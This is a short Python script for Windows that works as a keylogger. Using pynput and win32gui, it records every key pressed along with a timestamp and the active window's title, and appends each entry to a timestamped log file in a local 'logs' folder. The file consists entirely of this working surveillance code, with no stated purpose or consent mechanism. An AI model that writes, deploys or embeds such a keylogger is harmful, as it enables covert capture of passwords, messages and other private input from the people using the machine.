import os

import win32gui
from pynput import keyboard
from datetime import datetime

if __name__ == '__main__':

    # open logs dir if doesn't exist, each log with the time that you ran the program.
    current_time = datetime.now().strftime("%Y-%m-%d %H-%M-%S")
    log_file = "log " + current_time + ".txt"
    log_dir = "logs/"
    if not os.path.exists(log_dir):
        os.makedirs(log_dir)
    log_file = log_dir + "log " + current_time + ".txt"


    # get the window that the user is on while pressing on keys
    def get_active_window_title():
        return win32gui.GetWindowText(win32gui.GetForegroundWindow())


    # on every press put it in the logs with time,window title name and key value.
    def on_press(key):
        title = get_active_window_title()
        current_time = datetime.now().strftime("%Y-%m-%d %H-%M-%S")
        with open(log_file, "a") as f:
            f.write("[{}] [{}] {}\n".format(current_time, title, key))


    def on_release(key):
        pass


    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
